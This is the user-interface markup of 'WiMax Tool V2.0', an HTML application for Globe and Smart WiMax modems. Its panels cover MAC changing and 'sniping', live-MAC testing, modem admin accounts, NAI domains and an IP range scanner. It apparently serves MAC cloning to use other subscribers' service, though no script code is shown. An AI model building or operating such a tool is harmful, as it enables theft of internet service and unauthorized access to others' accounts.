font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;BM622i 2011&nbsp;</span></label>
<br><label title ="Select this for BM622i 2010 device."> <input type="radio" id="radiobtnBm622i" name="SelectDeviceOption" value="BM622i2010" checked onclick ="Vbscript:SelectDeviceOptionRadioBtnClick"/><span id="spanRadiobtnBm622i" style="font-size: 12px; color: White;
font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;BM622i 2010&nbsp;</span></label>
<br><label title ="Select this for BM622 2011 device."><input type="radio" id="radiobtnBm6222011" name="SelectDeviceOption" value="BM6222011" onclick ="Vbscript:SelectDeviceOptionRadioBtnClick"/><span id="spanRadiobtnBm6222011" style="font-size: 12px;
color: White; font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;BM622 2011&nbsp;</span></label>
<br><label title ="Select this for BM622 2008-10 device."><input type="radio" id="radiobtnBm622" name="SelectDeviceOption" value="BM622" onclick ="Vbscript:SelectDeviceOptionRadioBtnClick"/><span id="spanRadiobtnBm622" style="font-size: 12px;
color: White; font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;BM622/5 2008-10&nbsp;</span></label>
<br><label title ="Select this for BM621 2009 device."><input type="radio" id="radiobtnBm621" name="SelectDeviceOption" value="BM621" onclick ="Vbscript:SelectDeviceOptionRadioBtnClick"/><span id="spanRadiobtnBm621" style="font-size: 12px;
color: White; font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;BM621 2009&nbsp;</span></label>
</div>
</div>
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;padding: 5px;">
<center>
<input title ="Click to exit the tool." type="button" value=" Exit " onclick="VBScript:CloseWindowSnipe" class="MenuBtn">
<input title ="Click to get OS version." type="button" value=" OS version " onclick="VBScript:GetOSVersion" class="MenuBtn">
<input title ="Click to save and apply changes." type="button" value="Save settings" onclick="VBScript:CreateWimaxAccount" class="MenuBtn">
</center>
</td>
</tr>
<tr>
<tr> 
<td style="background-color:#660000;"> 
<center>
<div style=" display: none;" >
<span style=" display: inline-block; color: White;font-weight: bold " >NOTE: Click SAVE settings button. <BR> TO APPLY CHANGES!!!</span>
</div>
</center>
<div style="width:100%;margin-top:5px; margin-bottom:5px;margin-left:8px; ">
<!--downloadfiletype-->

<select style=" font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="snipeTryList"
name="snipeTryList" onchange="VBScript:CreateTestTryAndSpeedSettings" >
<option value="6"> 6 times</option>
<option value="1"> 1 time</option>
<option value="3"> 2 times</option>
<option value="3"> 3 times</option>
<option value="4"> 4 times</option>
<option value="5"> 5 times</option>
<option value="7"> 7 times</option>
<option value="8"> 8 times</option>
<option value="10"> 10 times</option>
<option value="15"> 15 times</option>
<option value="20"> 20 times</option>
</select>
<label title ="Number of Test Try"><span id = "snipeTestTryLabel" style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>&nbsp;- Test MAC Live. (Lower # is LESS accurate but FAST.)</b></span></label>
<div style="height: 5px;">
<!--comment-->
</div>
<select style=" font-size: 12; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="liveIPTryList"
name="liveIPTryList" onchange="" >
<option value="+63905">0905</option>
<option value="+63906">0906</option>
<option value="+63907">0907</option>
<option value="+63908">0908</option>
<option value="+63909">0909</option>
<option value="+63910">0910</option>
<option value="+63912">0912</option>
<option value="+63915">0915</option>
<option value="+63916">0916</option>
<option value="+63917">0917</option>
<option value="+63918">0918</option>
<option value="+63919">0919</option>
<option value="+63920">0920</option>
<option value="+63921">0921</option>
<option value="+63922">0922</option>
<option value="+63923">0923</option>
<option value="+63926">0926</option>
<option value="+63927">0927</option>
<option value="+63928">0928</option>
<option value="+63929">0929</option>
<option value="+63930">0930</option>
<option value="+63932">0932</option>
<option value="+63933">0933</option>
<option value="+63935">0935</option>
<option value="+63936">0936</option>
<option value="+63937">0937</option>
<option value="+63938">0938</option>
<option value="+63939">0939</option>
<option value="+63942">0942</option>
<option value="+63943">0943</option>
<option value="+63946">0946</option>
<option value="+63947">0947</option>
<option value="+63948">0948</option>
<option value="+63949">0949</option>
<option value="+63989">0989</option>
<option value="+63996">0996</option>
<option value="+63997">0997</option>
<option value="+63998">0998</option>
<option value="+63999">0999</option>
</select>
<input title ="Enter phone # here." type="text" style=" padding-left:5px; padding-right:5px;background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="8" name="inputPhone" id="inputPhone"
value="1234567">
<label title ="Click to Save Phone Number."><input  type="button"  name="btnSavePhone" value="Save Phone"
onclick="VBScript:CreateTestTryAndSpeedSettings" class="btn"></label>
<label title ="Number of Test Try"><span id = "liveIPTryLabel" style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>&nbsp;- Phone (SMS/Text Notifier)</b></span></label>
<div style="height: 5px;">
<!--comment-->
</div>
<select style=" font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="fileSizeList"
name="fileSizeList" onchange="VBScript:CreateTestTryAndSpeedSettings" >
<option value="10MB"> 10 MB, VERY SLOW/MORE Accurate</option>
<option value="5MB"> 5 MB,  SLOW/Accurate</option>
<option value="5MBNY"> 5 MB, By: NewYork, SLOW/Accurate</option>
<option value="5MBAMS"> 5 MB, By: Amster, SLOW/Accurate</option>
<option value="5MBLA"> 5 MB, By: LosAngles, SLOW/Accurate</option>
<option value="5MBSPT"> 5 MB, By: SPT, SLOW/Accurate</option>
<option value="1MB"> 1 MB, FAST/LESS Accurate</option>
<option value="100KB"> 100 KB, VERY FAST/LESS Accurate</option>
</select>
<label title ="Select File Size"><span id = "fileSizeLabel" style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>&nbsp;- DL Speed Test File Size.</b></span></label>
<!--DownloadfiletypeEND-->
</div>
</td>
</tr>
<td style="background-color:#330000;padding: 5px;">
<center>
<input title ="Click to Shutdown PC." type="button" value="Shutdown PC" onclick="VBScript:ShutdownPC" class="MenuBtn">   
<input title ="Clear Error Log File." type="button" value="Clear Log File" onclick="VBScript:ClearErrorLog" class="MenuBtn">            
<input title ="View Error Log File." type="button" value="View Log File" onclick="VBScript:ViewErrorLog" class="MenuBtn">          
</center>
</td>
</tr>
</table>
</div>
<!--End of tab5sub1-->
<!--tab5sub2-->
<div cellpadding="0" class="panel" id ="panelSubTel2">
<table width="100%" border="1">
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Wimax Web GUI Account (<U>User and Admin</U>)</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<div style="width:100%;margin-top:5px; margin-bottom:5px; ">
<div style="float: left; width:50%; border-right: solid 1px white ;margin-bottom: 5px; padding-top:5px;padding-bottom:5px;">
<center>
<span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma; ">
<b>Web User Account</b></span>
<br>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 75px;font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Username:</b></span>
<input title ="Enter Web user username here." type="text" style=" padding-left:5px; padding-right:5px;background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="inputWebUserUname"
tabindex="1" value="user">
<br>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 75px;font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Password:</b></span>
<input title ="Enter Web user password here." type="text" style=" padding-left:5px; padding-right:5px;background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="inputWebUserPassowrd"
tabindex="1" value="user">
<div style="height: 5px;">
<!--comment-->
</div>
<label title ="Select this to use default User username."> <input type="radio" id="radiobtnWebUserDef" name="SelectWebAccountOptionWebUser" value="Webuserdef" checked onclick ="Vbscript:SelectWebAccountOptionRadioBtnClick"/><span id="spanRadiobtnWebUserDef" style="font-size: 12px; color: White;
font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Default&nbsp;</span></label>
<label title ="Select this to use costumize User username."> <input type="radio" id="radiobtnWebUserCus" name="SelectWebAccountOptionWebUser" value="Webusercus" onclick ="Vbscript:SelectWebAccountOptionRadioBtnClick"/><span id="spanRadiobtnWebUserCus" style="font-size: 12px; color: White;
font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Custom&nbsp;</span></label>


</center>
</div>
<div style="float: left; width:49%; ">
<div style="margin: 5px;"  >
<center>
<span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma; ">
<b>Web Admin Account</b></span>
<br>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 75px;font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Username:</b></span>
<input title ="Enter Web admin username here." type="text" style=" padding-left:5px; padding-right:5px;background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="inputWebAdminUname"
tabindex="1" value="admin">
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 75px;font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Password:</b></span>
<input title ="Enter Web admin password here." type="text" style=" padding-left:5px; padding-right:5px;background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="16" name="inputWebAdminPassowrd"
tabindex="1" value="Generated">
<div style="height: 5px;">
<!--comment-->
</div>
<label title ="Select this to use default admin username."> <input type="radio" id="radiobtnWebAdminDef" name="SelectWebAccountOptionWebAdmin" value="Webadmindef" checked onclick ="Vbscript:SelectWebAdminAccountOptionRadioBtnClick"/><span id="spanRadiobtnWebAdminDef" style="font-size: 12px; color: White;
font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Default&nbsp;</span></label>
<label title ="Select this to use cosmtumize admin username."> <input type="radio" id="radiobtnWebAdminCus" name="SelectWebAccountOptionWebAdmin" value="Webadmincus"  onclick ="Vbscript:SelectWebAdminAccountOptionRadioBtnClick"/><span id="spanRadiobtnWebAdminCus" style="font-size: 12px; color: White;
font-weight: Bold; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Custom&nbsp;</span></label>

</center>

</div>
</div>
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;padding: 5px;">
<center>
<input title ="Click to exit the tool." type="button" value=" Exit " onclick="VBScript:CloseWindowSnipe" class="MenuBtn">
<input title ="Click to save and apply changes." type="button" value="Save Web settings" onclick="VBScript:CreateWimaxWebAccount" class="MenuBtn">
</center>
</td>
</tr>

<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Default MAC (<U>Your working MAC.</U>)</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<div style="margin-left: 8px;margin-right: 8px; padding-top:5px;padding-bottom:5px;">
<!--Default Working ACCOUNT-->
<label style ="margin-left: 60px;" title = " &#8226; Check to allow N.A.I. changes.&#013; &#8226; Un-check to deny N.A.I. changes."><input type="checkbox" id="chkAllowNaiDef" name ="chkAllowNaiDef" checked onclick="VBScript:GetChkAllowNaiDef" /><span id ="chkAllowNaiLabelDef" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Change N.A.I.?&nbsp;</span></label>
<label style ="margin-left: 15px;" title = " &#8226; Check to enable TLS Authentication.&#013; &#8226; Un-check to disable TLS Authentication.Use TTLS"><input type="checkbox" id="chkEnableTLSDef" name ="chkEnableTLSDef"  onclick="VBScript:GeChkEnableTLSDef" /><span id ="chkEnableTLSLabelDef" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Enable TLS?&nbsp;</span></label>
<label style ="margin-left: 15px;" title = " &#8226; Check to restore default MAC using Restore METHOD.&#013; &#8226; Uncheck to restore default MAC using REBOOT METHOD."><input type="checkbox" id="chkEnableRestore" name ="chkEnableRestore"  onclick="VBScript:GeChkEnableRestore" /><span id ="chkEnableLabelRestore" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Restore Method&nbsp;</span></label>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 90px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Default MAC:</b></span>
<input type="text" style=" padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="22" name="inputDefaultMAC"
tabindex="1" value="Enter MAC here" title="Edit to change Default mac." onkeyup="VBScript:CheckMyDefaultMacIsValid" onkeydown="VBScript:CheckMyDefaultMacIsValid" >
<label title ="Click to Paste."><input  type="button" tabindex="3" name="btnPasteDefaultMac" value=" Paste "
onclick="VBScript:PasteTextDefaultMac" class="btn"></label>
<label title ="Click to refresh."><input  type="button" name="btnRefreshDefaultMac" value=" Refresh "
onclick="VBScript:PopulateMyDefaultMac" class="btn"></label>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 90px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Domain:</b></span>
<select style="font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="drpDwnDefaultMacDomain"
name="drpDwnDefaultMacDomain" onchange="">
<option value="@globelines.com.ph">@globelines.com.ph</option>
<option value="@huawei.com">@huawei.com</option>
<option value="@globetel.com.ph">@globetel.com.ph</option>
<option value="@innove.com.ph">@innove.com.ph</option>
<option value="@smartbro.net">@smartbro.net</option>
</select>
<br>
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 90px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>UserId & Pass:</b></span>
<input type="text" style=" padding-left:5px; padding-right:5px; background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="22" name="inputDefaultMACPassword"
tabindex="1" value="Enter Password here" title="Edit to change Password.">
<label title ="Click to Paste."><input  type="button" tabindex="3" name="btnPasteDefaultMacPassword" value=" Paste "
onclick="VBScript:PasteTextDefaultMacPassword" class="btn"></label>
<label title ="Click to Default PAss"><input  type="button" tabindex="3" name="btnLoadDefaultMacPassword" value=" Default "
onclick="VBScript:LoadDefaultMacPassword" class="btn"></label>
<div style="height: 5px;">
<!--comment-->
</div>
<tr>
<td style="background-color:#330000;padding: 5px;">
<center>
<input title ="Click to Change your MAC" type="button" value=" Change MAC " onclick="VBScript:RestoreDefaultMac" class="MenuBtn" name="btnChangeMacDefault">
<input title ="Click to save and apply changes." type="button" value="Save default MAC" onclick="VBScript:CreateDefaultMacFile" class="MenuBtn" name="btnSaveMacDefault">
</center>
</td>
</tr>
<!--Default Working ACCOUNT-->
</div>
</td>
</tr>
</table>
</div>
<!--End of tab5sub2-->
<!--tab5sub3-->
<div cellpadding="0" class="panel" id ="panelSubTel3">
<p id = "about" style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
Script by: yyyxyyyz
<br>
<br>
<u>Disclaimer:</u>  THIS SCRIPT IS PROVIDED "AS IS". THAT MEANS THAT EVEN
IF IT HAS BEEN TESTED (MAY NOT RELIABLE), IT'S POSSIBLE THAT THERE ARE BUGS
THAT CAN DESTROY A FILE, A FOLDER OR A WHOLE DISK. BE WARNED.
BACK UP ANY CRITICAL DATA TO BE SAFE. USE IT AT YOUR OWN RISK,
I'M NOT RESPONSIBLE FOR ANY CORRECT OR INCORRECT USE OF THIS SOFTWARE.
I CAN'T BE HELD RESPONSIBLE FOR ANY DIRECT OR INDIRECT DAMAGE OR LOSS
CAUSED BY THE USE OF THIS SCRIPT.
<br>
<br>
<u>Legal Disclaimer:</u> THIS SOFTWARE WAS WRITTEN AND IS INTENDED ONLY
FOR PERSONAL BACKUP AND EDUCATIONAL PURPOSES. USE IT AT YOUR
OWN RISK, I'M NOT RESPONSIBLE FOR ANY LEGAL OR ILLEGAL USE OF THIS SCRIPT.
</p>
<center>
<label title = "Enable automatic check tool update."><input type="checkbox" id="chkAutoCheckUpdate" name ="chkAutoCheckUpdate" checked onclick="VBScript:GetChkAutoCheckUpdate" style="display:inline;" /><span id="chkAutoCheckUpdateLabel" name="chkAutoCheckUpdateLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma; display:inline;">&nbsp;Enable AUTOMATIC check TOOL update.&nbsp;</span></label>
</center>
<div style="height: 5px;">
<!--comment-->
</div>
<table width="100%" border="1">
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>System Info (<U>Required for 622m user.</U>)</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;padding: 5px;">
<span style="display: inline-block; width: 90px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>My System:</b></span>
<select style="font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="drpDwnOs"
name="drpDwnOs" onchange="">
<option value="winxp-32">Windows XP (32-bit)</option>
<option value="winVista-7-8-32">Windows Vista/7/8 (32-bit)</option>
<option value="winxp-64">Windows XP (64-bit)</option>
<option value="winVista-7-8-64">Windows Vista/7/8 (64-bit)</option>
</select>
<input title ="Click to Detect my O.S" type="button" value="Detect O.S." onclick="VBScript:DetectOsArch" class="btn" name="btnDetectOs">
<div style="height: 5px;">
<!--comment-->
</div>
<span style="display: inline-block; width: 90px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Adapter(LAN):</b></span>
<select style="font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma; width:200px" tabindex="" size="1" id="drpDwnNetAdapter"
name="drpDwnNetAdapter" onchange="">
<option value="emptylist">Select Network Adapter</option>
</select>
<input title ="Click to Load LAN Network Adapter" type="button" value="Refresh" onclick="VBScript:GetNetworkAdapterList" class="btn" name="RefreshAdapterList">
<div style="height: 5px;border-bottom:solid 1px white;">
<!--comment-->
</div>
<div style="height: 5px;">
<!--comment-->
</div>
<center>
<select style="font-size: 12;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="drpDwnTestLanOption"
name="drpDwnTestLanOption" onchange="">
<option value="disable">Disable</option>
<option value="enable">Enable</option>
<option value="bothtest">Both</option>
</select>
<input title ="Click to Test disable/enable LAN" type="button" value="Test W/LAN Only" onclick="VBScript:TestDisableEnableLan" class="btn" name="btnTestLan">
<input title ="Click to save and apply changes." type="button" value="Save Settings" onclick="VBScript:CreateMySystemInfo" class="MenuBtn" name="btnSaveSysInfo">
</center>
</td>
</tr>
</table>
</div>
<!--End of tab5sub3-->
</div>
<!--===============================================================-->
<!--end tab5-->
<!--===============================================================-->
<div cellpadding="0" class="panel" id ="panel6">
<table width="100%" border="1">
<tr>
<td style="background-color:#660000;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0000', endColorstr='#660000',GradientType=1);">
<span style="display: inline-block; zoom: 1; *display: inline; font-size: 8px; color: White;
font-weight: normal; margin-left: 6px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;
background-color: white; height: 8px;">&nbsp;&nbsp;</span> <span style="font-size: 12px;
color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>IP Scanner</b></span>
<div style="height: 5px;">
<!--comment-->
</div>
</td>
</tr>
<tr>
<td style="background-color:#330000;">
<div style="margin-left: 8px; margin-bottom: 5px; margin-top: 10px;">
<span style="width: 100px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Start IP range: &nbsp;&nbsp;</b> </span>
<input title ="Enter START IP here." type="text" style="  padding-left:5px; padding-right:5px; background-color: #FFFFFF; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma; font-size: 12px; height:22px; line-height:16px;" size="20" id="InputStartIp"
name="InputStartIp" onkeyup="VBScript:OnKeyUpDownInputIpStartAdd" onkeydown="VBScript:OnKeyUpDownInputIpStartAdd" 
onclick="VBScript:OnKeyUpDownInputIpStartAdd" tabindex="1" value="10.0.0.1">&nbsp;&nbsp;
<label title ="Click to Restore Default Settings."><input  type="button" name="clearFieldIpScan" value="Restore" onclick="VBScript:RestoreIpAdd" class="btn"></label>
<label title ="Click to Paste."><input  type="button" tabindex="3" name="btnPasteMacPassGen" value=" Paste "
onclick="VBScript:PasteTextIpAddScan" class="btn"></label>
<label style ="display: none" title ="Click Test Stream."><input  type="button" tabindex="3" name="btnTEstStream" value=" Test "
onclick="VBScript:GetCurrentLiveIP" class="btn"></label>
</div>
<div style="margin-left: 8px; margin-bottom: 5px; margin-top: 10px;">
<span style="width: 100px; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>End IP range: &nbsp;&nbsp;</b> </span>
<input title ="Enter END IP here." type="text" style="  padding-left:5px; padding-right:5px; background-color: #FFFFFF; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma; font-size: 12px; height:22px; line-height:16px;" size="20" id="InputEndIp"
name="InputEndIp" onkeyup="VBScript:OnKeyUpDownInputIpEndAdd" onkeydown="VBScript:OnKeyUpDownInputIpEndAdd" 
onclick="VBScript:OnKeyUpDownInputIpEndAdd" tabindex="1" value="10.255.255.255">&nbsp;&nbsp;
<span Title = "The maximum END IP range to use is 255.255.255.255" id="ipMaxRange" style="font-size: 11;
color: White; font-weight: normal; background-color:#ff0000;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Max End IP: 255.255.255.255&nbsp;</span>
</div>
<hr>
<span style=" float: left;display: inline-block; font-size: 12;margin-left:8px; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Log status:</b></span> 
<span style =" float: right;margin-right:12px;"><span style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
<b>Alive IP:</b></span><input title ="Current Live IP count." type="text" style="padding-left: 3px;margin-left:5px;background-color: #FFFFFF;font-size: 12px; height: 22px;line-height: 16px;" size="2"
name="currentLiveIp" id="currentLiveIp" readOnly value="0"></span>
<div class="ContentIpScanLog" title ="List of current live IP address.">
<textarea style="padding-left: 5px; margin-top:3px; height: 210px; width: 395px; font-size: 10; color: green; background-color: #000000;
font-weight: normal; margin-bottom: 2px; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" title="Scan log area"
name="LogLiveIp" rows="35" cols="100" readonly>Status idle...</textarea>
<div>
</td>
</tr>
<tr>
<td style="background-color:#330000;padding:4px;">
<center>
<label title = "Check this box to scan IP for SMART users (DEFAULT is GLOBE)."><input type="checkbox" id="chkSmartScan" name ="chkSmartScan" onclick="VBScript:GetChkSmartScan" /><span id="smartScanLabel" name="smartScanLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;SMART IP only&nbsp;</span></label>
<label title = "Allow to shutdown pc? Maybe requires ADMIN rights.."><input type="checkbox" id="chkShutDownIpScan" name ="chkShutDownIpScan" onclick="VBScript:GetChkShutDownIpScan" /><span id="shutdownIpScanPCLabel" name="shutdownIpScanPCLabel" style="font-size: 11;
color: White; font-weight: normal;  font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">&nbsp;Shutdown PC after scan&nbsp;</span></label>
<select style=" font-size: 11;font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;" tabindex="" size="1" id="scanIPTryList"
name="scanIPTryList" onchange="" >
<option value="1"> 1 time</option>
<option value="2"> 2 times</option>
<option value="3"> 3 times</option>
</select>
<label title ="Number of Test Try"><span id = "scanIPTryLabel" style="display: inline-block; font-size: 12; color: White; font-weight: normal; font-family: Trebuchet MS, Helvetica, sans-serif, Tahoma;">
Check IP add.</span></label>
<div style="height: 6px;">
<!--comment-->
</div>
<input title ="Click to exit the tool." type="button" value=" Exit " onclick="VBScript:CloseWindowSnipe" class="MenuBtn">
<input title ="View denied access IP scan / error logs." type="button" value="View Log File" onclick="VBScript:ViewErrorLog" class="MenuBtn">
<label title ="Click to start IP scanning."> <input type="button" id ="" name="btnStartIpScan" value="START Scan" onclick="VBScript:ScanIpRange" class="MenuBtn"> </label>
<input title ="Click to stop IP processing." type="button" value="STOP!" onclick="VBScript:StopIpScanning" class="MenuBtn">
</center>
</td>
</tr>
<tr> 
<td style="background-color:#660000;"> <center>
<span style=" display: inline-block; color: White;font-weight: Normal " ><U>Requirements:</U>  Connected to WiMax Network (Internet). <BR> Any wimax device can use this feature.</span>
</center>
</td>
</tr>
</table>
</div>
<center>
WiMax Tool V2.0 [Script by: yyyxyyyz]
</center>
</body>
</html>